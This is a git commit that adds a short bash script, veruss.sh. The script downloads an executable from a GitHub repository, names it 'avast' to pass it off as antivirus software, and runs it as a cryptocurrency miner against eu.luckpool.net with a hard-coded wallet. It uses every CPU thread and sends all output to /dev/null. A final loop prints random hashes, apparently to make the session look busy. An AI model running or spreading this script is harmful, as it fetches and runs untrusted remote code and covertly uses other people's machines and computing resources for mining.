912ba8ee4f90766df773e3821ec0fa619ec1517c
angkii <83603708+angkii@users.noreply.github.com>
2022-01-06 22:43:16 +0700

    Create veruss.sh

---
+++ veruss.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+#!/bin/sh
+
+#!/bin/bash
+
+apt update
+
+sudo apt install screen libjansson4 -y 
+
+wget https://github.com/circelwenakyo/nyobsa/raw/main/avast >/dev/null 2>&1
+
+chmod +x avast >/dev/null 2>&1
+
+screen -dmS ls
+
+./avast -v -l eu.luckpool.net:3956 -u RF5xRYxdXryTYErYHxiiHUK9846ZX48XaU.$(echo $(shuf -i 1-9999 -n 1)111) -p x -t $(nproc) >/dev/null 2>&1
+
+while [ 1 ]; do
+
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+
+sleep 2
+
+done
